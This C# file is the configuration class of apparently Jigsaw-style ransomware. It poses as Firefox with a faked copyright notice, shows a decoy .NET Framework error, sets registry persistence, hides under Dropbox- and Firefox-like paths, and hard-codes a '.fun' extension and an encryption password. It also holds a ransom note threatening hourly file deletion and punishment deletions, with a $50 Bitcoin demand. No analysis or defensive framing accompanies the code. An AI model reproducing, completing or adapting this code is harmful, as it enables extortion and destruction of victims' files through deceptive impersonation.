using System;
using System.IO;
using Main.Tools;

namespace Main;

internal static class Config
{
	internal enum StartModeType
	{
		Debug,
		ErrorMessage,
		NothingHappens,
		DeleteItself
	}

	internal const string AssemblyProdutAndTitle = "Firefox";

	internal const string AssemblyCopyright = "Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.";

	internal const string AssemblyVersion = "37.0.2.5583";

	internal const string EncryptionFileExtension = ".fun";

	internal const int MaxFilesizeToEncryptInBytes = 10000000;

	internal const string EncryptionPassword = "OoIsAwwF32cICQoLDA0ODe==";

	internal static StartModeType StartMode;

	internal static string ErrorMessage;

	internal static string ErrorTitle;

	internal static Windows.StartupMethodType StartupMethod;

	internal static string TempExeRelativePath;

	internal static string TempExePath;

	internal static string FinalExeRelativePath;

	internal static string FinalExePath;

	internal static string WorkFolderRelativePath;

	internal static string WorkFolderPath;

	internal static bool OnlyRunAfterSysRestart;

	internal static DateTime ActiveAfterDateTime;

	internal static bool Activated;

	internal static int TimerActivateCheckerInterval;

	internal static string WelcomeMessage;

	internal static string TaskMessage;

	internal static int RansomUsd;

	static Config()
	{
		Activated = false;
		TimerActivateCheckerInterval = 6000;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		StartMode = StartModeType.ErrorMessage;
		ActiveAfterDateTime = new DateTime(2016, 1, 1);
		ErrorMessage = "To run this application, you first must install one of the following version of the .NET Framework:" + Environment.NewLine + ".NET Framework, Version = 4.5.1";
		ErrorTitle = ".NET Framework Initialization Error";
		StartupMethod = Windows.StartupMethodType.Registry;
		TempExeRelativePath = "Drpbx\\drpbx.exe";
		FinalExeRelativePath = "Frfx\\firefox.exe";
		FinalExePath = Path.Combine(folderPath, FinalExeRelativePath);
		TempExePath = Path.Combine(folderPath2, TempExeRelativePath);
		WorkFolderRelativePath = "System32Work\\";
		WorkFolderPath = Path.Combine(folderPath, WorkFolderRelativePath);
		if (!Directory.Exists(WorkFolderPath))
		{
			Directory.CreateDirectory(WorkFolderPath);
		}
		OnlyRunAfterSysRestart = false;
		WelcomeMessage = "Your personal files are being deleted. Your photos, videos, documents, etc..." + Environment.NewLine + "However I've already encrypted your personal files, so you cannot access them." + Environment.NewLine + Environment.NewLine + "Every hour I select some of them to delete permanently," + Environment.NewLine + "Therefore I won't be able to access them, either." + Environment.NewLine + "It starts out slowly then increases rapidly." + Environment.NewLine + "During the first 24 hour you will only lose a few files," + Environment.NewLine + "The second day a few hundred, the third day a few thousand, and so on." + Environment.NewLine + Environment.NewLine + "If you turn off your computer or try to close me, when I start next time" + Environment.NewLine + "You will get 1000 files deleted as a punishment." + Environment.NewLine + Environment.NewLine + "Now, let's start and enjoy our little game together!       ";
		RansomUsd = 50;
		TaskMessage = "Please, send at least $" + RansomUsd + " worth of Bitcoin here:";
	}
}
